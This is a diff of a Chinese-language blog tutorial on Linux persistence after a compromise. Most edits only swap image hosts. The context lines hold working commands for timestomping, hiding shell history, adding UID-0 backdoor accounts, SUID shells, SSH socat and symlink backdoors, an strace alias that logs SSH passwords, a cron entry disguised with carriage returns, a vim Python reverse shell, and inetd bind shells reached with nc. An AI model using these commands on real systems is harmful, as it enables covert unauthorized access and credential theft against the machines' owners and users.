@@ -2,6 +2,7 @@
 title: "linux权限维持"
 date: 2025-12-11T00:00:00+08:00
 draft: false
+
 ---
 
 # linux权限维持
@@ -13,16 +14,18 @@ draft: false
 有时我们会根据文件修改时间来判断文件是否为后门，比如对比shell.php和index.php的修改时间是否相差过大
 
 touch命令用于修改文件或者目录的时间属性，可以使用touch修改文件创建时间：
+
 ~~~shell
 touch -r index.php shell.php
 # 将shell.php的修改时间改为和index.php一致
 ~~~
 
-![image-20241126212023666](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241126212025017-463283678.png)
+![image-20241126212023666](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126212025017-463283678.png)
 
 #### 文件锁定
 
 在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，而此权限用ls -l是查看不出来的，从而达到隐藏权限的目的：
+
 ~~~shell
 chattr +i evil.php  #锁定文件
 rm -rf evil.php     #直接删除会提示禁止删除
@@ -32,7 +35,7 @@ chattr -i evil.php  #解除锁定
 rm -rf evil.php     #此时才可以正常删除文件
 ~~~
 
-![image-20241126212501296](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241126212502426-793342345.png)
+![image-20241126212501296](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126212502426-793342345.png)
 
 #### 历史操作命令
 
@@ -56,7 +59,7 @@ rm -rf evil.php     #此时才可以正常删除文件
 
 可以看看下面这个情况：
 
-![image-20241126213946978](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241126213948268-983788722.png)
+![image-20241126213946978](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126213948268-983788722.png)
 
 上图利用这个方法使`echo 2nd`的命令记录没有被存储在history中
 
@@ -70,7 +73,7 @@ rm -rf evil.php     #此时才可以正常删除文件
   history | grep "keyword"
   ~~~
 
-  ![image-20241126214456252](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241126214457282-2004294411.png)
+  ![image-20241126214456252](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126214457282-2004294411.png)
 
 * 上面查询得到了对应命令记录的id，接下来进行删除：
 
@@ -78,7 +81,7 @@ rm -rf evil.php     #此时才可以正常删除文件
   history -d [num]
   ~~~
 
-  ![image-20241126214956966](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241126214958158-1537806554.png)
+  ![image-20241126214956966](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126214958158-1537806554.png)
 
   虽然这样删除了历史记录，但我上面执行的命令也被记录了，所以我个人认为上面关闭历史记录的方法更有效
 
@@ -96,7 +99,7 @@ root权限时，我们可以直接通过写入passwd文件进行用户写入
 ⽤户名：密码：⽤户ID：组ID：身份描述：⽤户的家⽬录：⽤户登录后所使⽤的SHELL
 ~~~
 
-![image-20241126223641041](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241126223642368-1367413835.png)
+![image-20241126223641041](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126223642368-1367413835.png)
 
 可以根据这个格式增加超级用户：
 
@@ -146,7 +149,7 @@ passwd yuy0ung #修改yuy0ung的密码
   useradd hacker -u 0 -o -g root -G root|| echo "123456" | passwd --stdin hacker #创建账户hacker、密码123456且为root权限
   ~~~
 
-  ![image-20241127120043062](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241127120044711-904935737.png)
+  ![image-20241127120043062](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127120044711-904935737.png)
 
 * 第二种，创建普通用户：
 
@@ -154,7 +157,7 @@ passwd yuy0ung #修改yuy0ung的密码
   useradd test || echo "123456" | passwd --stdin test
   ~~~
 
-  ![image-20241127120533807](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241127120536131-1916933809.png)
+  ![image-20241127120533807](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127120536131-1916933809.png)
 
   这种方法的用户权限很小
 
@@ -164,7 +167,7 @@ passwd yuy0ung #修改yuy0ung的密码
   useradd -u 0 -o -g root -G root test2 || echo -e "1qazwsx2wsx\n1qazwsx2wsx"|passwd test2
   ~~~
 
-  ![image-20241127121050400](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241127121052371-777897794.png)
+  ![image-20241127121050400](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127121052371-777897794.png)
 
 ### suid后门
 
@@ -186,7 +189,7 @@ chmod 4755 /tmp/.mybash
 /tmp/.mybash -p
 ~~~
 
-![image-20241127122027484](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241127122029475-2034687517.png)
+![image-20241127122027484](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127122029475-2034687517.png)
 
 ### SSH后门
 
@@ -215,7 +218,7 @@ systemctl restart sshd
 # 重启SSH守护进程服务
 ~~~
 
-![image-20241127212050144](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241127212051712-211947944.png)
+![image-20241127212050144](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127212051712-211947944.png)
 
 连接时在本机执行：
 
@@ -225,7 +228,7 @@ socat STDIO TCP4:192.168.111.145:22,sourceport=13377
 
 即可连接并获取shell：
 
-![image-20241127212132755](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241127212133773-1480381265.png)
+![image-20241127212132755](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127212133773-1480381265.png)
 
 这里的原理很巧妙：
 
@@ -249,7 +252,7 @@ ln -sf /usr/sbin/sshd /tmp/su
 /tmp/su -oPort=8080
 ~~~
 
-![image-20241128213448909](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241128213449753-1183703138.png)
+![image-20241128213448909](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128213449753-1183703138.png)
 
 连接：
 
@@ -269,11 +272,11 @@ ssh root@[ip] -p 8080
   ssh-keygen -b 4096 -t rsa  #直接三个回车
   ~~~
 
-  ![image-20241128224552342](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241128224553936-1086514457.png)
+  ![image-20241128224552342](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128224553936-1086514457.png)
 
 * 查看生成的公钥内容：
 
-  ![image-20241128224644487](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241128224646044-499679776.png)
+  ![image-20241128224644487](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128224646044-499679776.png)
 
   复制这个内容
 
@@ -287,7 +290,7 @@ ssh root@[ip] -p 8080
   chmod 700 ~/.ssh
   ~~~
 
-  ![image-20241128225034898](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241128225035899-352880271.png)
+  ![image-20241128225034898](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128225035899-352880271.png)
 
 * 接下来就可以免密连接：
 
@@ -295,7 +298,7 @@ ssh root@[ip] -p 8080
   ssh -i /root/.ssh/id_rsa root@目标ip
   ~~~
 
-  ![image-20241128230337482](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241128230338673-1273744881.png)
+  ![image-20241128230337482](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128230338673-1273744881.png)
 
 #### SSH Keylogger记录密码
 
@@ -307,7 +310,7 @@ ssh root@[ip] -p 8080
 alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
 ~~~
 
-![image-20241129170758166](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129170800169-1003344408.png)
+![image-20241129170758166](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129170800169-1003344408.png)
 
 尝试连接：
 
@@ -315,11 +318,11 @@ alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -
 ssh kali@192.168.111.128
 ~~~
 
-![image-20241129172939658](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129172941870-330434312.png)
+![image-20241129172939658](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129172941870-330434312.png)
 
 可以看见只要ssh连接，就会在/tmp中生成log文件：
 
-![image-20241129173110197](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129173112278-482136561.png)
+![image-20241129173110197](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129173112278-482136561.png)
 
 读取密码：
 
@@ -328,7 +331,7 @@ grep "read(4" /tmp/.sshpwd-29Nov111732872501.log | tail -n 20
 # 根据不同环境自行调试响应行数
 ~~~
 
-![image-20241129173450474](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129173452343-992246258.png)
+![image-20241129173450474](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129173452343-992246258.png)
 
 可以看见输入了密码为kali
 
@@ -345,11 +348,11 @@ strace -f -p 1015510 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048
 
 然后等待别人连入：
 
-![image-20241129175237666](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129175239828-1243548610.png)
+![image-20241129175237666](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129175239828-1243548610.png)
 
 连入后监听端会有流量：
 
-![image-20241129175318050](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129175320508-1239492397.png)
+![image-20241129175318050](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129175320508-1239492397.png)
 
 接下来可以查看log文件：
 
@@ -357,7 +360,7 @@ strace -f -p 1015510 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048
 grep "read(6" /tmp/.ssh.log | tail -n 20
 ~~~
 
-![image-20241129174957267](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129174959876-1199405219.png)
+![image-20241129174957267](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129174959876-1199405219.png)
 
 这里可以看见连接密码为kali，这样就获取到了本机密码
 
@@ -372,7 +375,7 @@ cron嘛，都知道是用来做定时任务的
 ~~~
 
 但是这样的话，使用`crontab -l 就会被发现`，不够隐蔽：
-![image-20241129181834340](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129181836580-298457946.png)
+![image-20241129181834340](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129181836580-298457946.png)
 
 那么我们可以使用如下命令：
 
@@ -380,7 +383,7 @@ cron嘛，都知道是用来做定时任务的
 (crontab -l;printf "*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
 ~~~
 
-![image-20241129181959312](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129182001365-2039736802.png)
+![image-20241129181959312](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129182001365-2039736802.png)
 
 这时候管理员如果执行 `crontab -l` 就会看到显示"no crontab for root"，但这个回显其实是我们自己构造的，实际上是他将 cron 文件写到文件中,而 crontab -l 就是列出了该文件的内容：
 
@@ -410,19 +413,19 @@ with open("test.sh", "w") as f:
 
 生成出来一个test.sh，赋予一下权限:
 
-![image-20241129210026396](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129210028723-1328256524.png)
+![image-20241129210026396](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129210028723-1328256524.png)
 
 如果我们使用cat来读取：
 
-![image-20241129210123679](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129210126066-1097461210.png)
+![image-20241129210123679](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129210126066-1097461210.png)
 
 看见的就只是hello world，但如果我们尝试执行就会发现异常：
 
-![image-20241129210331598](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129210333907-1289640909.png)
+![image-20241129210331598](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129210333907-1289640909.png)
 
 很明显这个脚本是不止执行了上面的hello world的，这里需要用`cat -A`或者编辑器来查看文件：
 
-![image-20241129213359711](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129213402667-2072716227.png)
+![image-20241129213359711](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129213402667-2072716227.png)
 
 可以看见其实有隐藏内容的
 
@@ -469,7 +472,7 @@ vim poc.txt
 vim --version
 ~~~
 
-![image-20241129221249786](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129221252642-1706353464.png)
+![image-20241129221249786](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129221252642-1706353464.png)
 
 ok有python3，接下来编写脚本：
 
@@ -485,7 +488,7 @@ p = subprocess.call(["/bin/bash", "-i"]);
 
 接下来攻击机开启监听：
 
-![image-20241129221929097](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129221931725-126875695.png)
+![image-20241129221929097](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129221931725-126875695.png)
 
 目标主机执行命令：
 
@@ -495,7 +498,7 @@ p = subprocess.call(["/bin/bash", "-i"]);
 vim -E -c "py3file shell.py"
 ~~~
 
-![image-20241129222137517](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241129222140035-1166127872.png)
+![image-20241129222137517](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129222140035-1166127872.png)
 
 可以看见shell反弹成功
 
@@ -513,6 +516,7 @@ vim -E -c "py3file shell.py"
 ~~~
 
 接下来隐藏可疑的连接：
+
 ~~~shell
 mkdir null
 mount --bind null /proc/6238
@@ -536,7 +540,7 @@ daytime stream tcp nowait root /bin/bash bash -i
 inetd
 ~~~
 
-![image-20241202171059182](https://img2023.cnblogs.com/blog/3450279/202412/3450279-20241202171101390-349138686.png)
+![image-20241202171059182](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241202171101390-349138686.png)
 
 攻击机正向连接即可获得shell：
 
@@ -545,7 +549,7 @@ inetd
 nc -vv 192.168.111.145 13
 ~~~
 
-![image-20241202171119389](https://img2023.cnblogs.com/blog/3450279/202412/3450279-20241202171121698-2101423426.png)
+![image-20241202171119389](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241202171121698-2101423426.png)
 
 ~~~shell
 #可以配合suid后门，修改/etc/services文件：
@@ -555,14 +559,15 @@ suidshell stream tcp nowait root /bin/bash bash -i
 #可以修改成一些常见的端口，以实现隐藏
 ~~~
 
-![image-20241202171533457](https://img2023.cnblogs.com/blog/3450279/202412/3450279-20241202171535658-674212828.png)
+![image-20241202171533457](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241202171535658-674212828.png)
 
 同样直接正向连接即可：
+
 ~~~shell
 nc -vv 192.168.111.145 6666
 ~~~
 
-![image-20241202174429933](https://img2023.cnblogs.com/blog/3450279/202412/3450279-20241202174433254-116180685.png)
+![image-20241202174429933](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241202174433254-116180685.png)
 
 成功连接
 
